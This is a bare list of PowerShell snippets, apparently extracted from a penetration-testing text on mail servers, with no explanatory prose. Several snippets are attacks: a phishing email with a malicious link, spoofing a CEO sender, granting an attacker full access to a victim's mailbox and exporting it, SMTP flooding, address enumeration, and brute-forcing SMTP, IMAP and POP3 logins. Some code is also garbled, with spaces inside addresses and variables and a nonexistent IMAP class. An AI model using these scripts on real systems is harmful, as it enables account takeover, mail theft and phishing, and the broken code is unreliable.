["```\n Test-OutlookWebServices -ClientAccessServer mail.snowcapcyber.com -Autodiscover\n```", "```\n Get-User | Select-Object DisplayName, PrimarySmtpAddress\n```", "```\n Get-PublicFolder\n```", "```\n Get-ExchangeServer | Select-Object Name,AdminDisplayVersion\n```", "```\n Send-MailMessage -From attack er@snowcap cyber.com -To victim@snowcapcyber.com -Subject \"Important: Urgent Action Required\" -Body \"Click here to reset your password: htt p://malicious link.com\" -SmtpServer mail.contoso.com\n```", "```\n $cred = Get-Credential\n$cred.GetNetworkCredential().Password\n```", "```\n $Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri htt p://mail.conto so.com/PowerShell/ -Authentication Kerberos\nImport-PSSession $Session\nGet-Mailbox -User vic tim@snowcap cyber.com | Get-MailboxStatistics | Format-List LastLoggedOnUserAccount, LastLogonTime\n```", "```\n Add-MailboxPermission -User attac ker@snowca pcyber.com -AccessRights FullAccess -Identity vict im@snowcap cyber.com\n```", "```\n New-MailboxExportRequest -Mailbox vict im@snowcap cyber.com -FilePath \"\\\\server\\share\\export.pst\"\n```", "```\n Test-NetConnection -ComputerName mail.snowcapcyber.com -Port 25\n```", "```\n Send-MailMessage -To \"use r@snowcap cyber.com\" -From \"attacker@snowcapcyber.com\" -SmtpServer mail.snowcapcyber.com\n```", "```\n .\\Test-SMTPOpenRelay.ps1 -Server mail.snowcapcyber.com\n```", "```\n Send-MailMessage -To \"use r@snowcap cyber.com\" -From \"attacker@snowcapcyber.com\" -SmtpServer mail.snowcapcyber.com -Port 25 -Body \"EHLO\"\n```", "```\n Send-MailMessage -To \"use r@snowcap cyber.com\" -From \"ceo@snowcapcyber.com\" -SmtpServer mail.snowcapcyber.com\n```", "```\n 1..100 | ForEach-Object {\n    Send-MailMessage -To \"user@snowcapcyber.com\" -From \"attacker@snowcapcyber.com\" -SmtpServer mail.snowcapcyber.com\n}\n```", "```\n $email_addresses = \"use r1@snowcap cyber.com\", \"use r2@snowcap cyber.com\", \"use r3@snowcap cyber.com\"\n$valid_addresses = @()\nforeach ($address in $email_addresses) {\n    $result = Send-MailMessage -To $address -From \"attacker@snowcapcyber.com\" -SmtpServer mail.snowcapcyber.com -ErrorAction SilentlyContinue\n    if ($result -eq $null) {\n        $valid_addresses += $address\n    }\n}\nWrite-Host \"Valid Email Addresses: $($valid_addresses -join ', ')\"\n```", "```\n $passwords = Get-Content \"passwords.txt\"\n$users = Get-Content \"users.txt\"\nforeach ($user in $users) {\n    foreach ($password in $passwords) {\n        Send-MailMessage -To \"use r@snowcap cyber.com\" -From $user -SmtpServer mail.snowcapcyber.com -Credential (New-Object System.Management.Automation.PSCredential($user, (ConvertTo-SecureString -String $password -AsPlainText -Force)))\n    }\n}\n```", "```\n Send-MailMessage -To \"extern al@snowcap cyber.com\" -From \"user@snowcapcyber.com\" -SmtpServer mail.snowcapcyber.com\n```", "```\n Import-Module MailKit\nImport-Module MimeKit\n$server = \"imap.snowcapcyber.com\"\n$port = 993\n$username = \"andrewblyth\"\n$password = \"Th1s1sMypa55w0rd\"\n$imapClient = [MimeKit.Net.Imap.ImapClient]::new()\n$imapClient.Connect($server, $port, [System.Security.Authentication.SslProtocols]::Tls)\n$imapClient.Authenticate($username, $password)\n```", "```\n Resolve-DnsName -Name \"imap\" -Type MX\n```", "```\n $MyPasswordList = @(\"mypasswd1\", \"mypasswd2\")\nforeach ($password in $ MyPasswordList) {\n    try {\n        $imapClient.Authenticate($username, $password)\n        Write-Host \"Successful login: $password\"\n    } catch {\n        # Handle login failures here\n} }\n```", "```\n $capabilities = $imapClient.Capabilities\nif ($capabilities -contains \"STARTTLS\") {\n    Write-Host \"STARTTLS supported\"\n} else {\n    Write-Host \"STARTTLS not supported.\"     Exit }\n$sslVersion = $imapClient.SslProtocol\nWrite-Host \"Server SSL/TLS version: $sslVersion\"\n```", "```\n $banner = $imapClient.Banner\nWrite-Host \"IMAP Server Banner: $banner\"\n```", "```\n Test-NetConnection -ComputerName pop.example.com -CommonTCPPort POP3, POP3S\n```", "```\n $popServer = \"pop.example.com\"\n$port = 110\n$credentials = Get-Credential -Message \"Enter POP3 credentials\"\ntry {\n$popClient = New-Object System.Net.Sockets.TcpClient($popServer, $port)\n    $popStream = $popClient.GetStream()\n    $popReader = New-Object System.IO.StreamReader($popStream)\n    $popWriter = New-Object System.IO.StreamWriter($popStream)\n    $popWriter.WriteLine(\"USER \" + $credentials.UserName)\n    $popWriter.WriteLine(\"PASS \" + $credentials.GetNetworkCredential().Password)\n    $popWriter.WriteLine(\"QUIT\")\n    $response = $popReader.ReadToEnd()\n    if ($response -match \"OK\") {\n        Write-Host \"Authentication succeeded.\" } else {\n        Write-Host \"Authentication failed.\" }\n    $popClient.Close()\n} catch {\n    Write-Host \"Connection to POP server failed.\" }\n```", "```\n $popServer = \"pop.snowcapcyber.com\"\n$port = 110\n$users = \"ajcblyth\", \"jsmith\", \"pdavies\"\n$passwords = \"password1\", \"password2\", \"password3\"\nforeach ($user in $users) {\n    foreach ($password in $passwords) {\n        try {\n            $popClient = New-Object System.Net.Sockets.TcpClient($popServer, $port)\n            $popStream = $popClient.GetStream()\n            $popReader = New-Object System.IO.StreamReader($popStream)\n            $popWriter = New-Object System.IO.StreamWriter($popStream)\n            $popWriter.WriteLine(\"USER \" + $user)\n            $popWriter.WriteLine(\"PASS \" + $password)\n            $popWriter.WriteLine(\"QUIT\")\n            $response = $popReader.ReadToEnd()\n            if ($response -match \"OK\") {\n                Write-Host \"Brute force succeeded. User: $user, Password: $password\"\n                $popClient.Close()\n                Break }\n            $popClient.Close()\n        } catch {\n            Write-Host \"Connection to POP server failed.\"         }  } }\n```", "```\n $popServer = \"pop.snowcapcyber.com\"\n$port = 110\ntry {\n    $popClient = New-Object System.Net.Sockets.TcpClient($popServer, $port)\n    $popStream = $popClient.GetStream()\n    $popReader = New-Object System.IO.StreamReader($popStream)\n    $banner = $popReader.ReadLine()\n    Write-Host \"Banner: $banner.\"     $popClient.Close()\n} catch {\nWrite-Host \"POP Connection failed.\"}\n```"]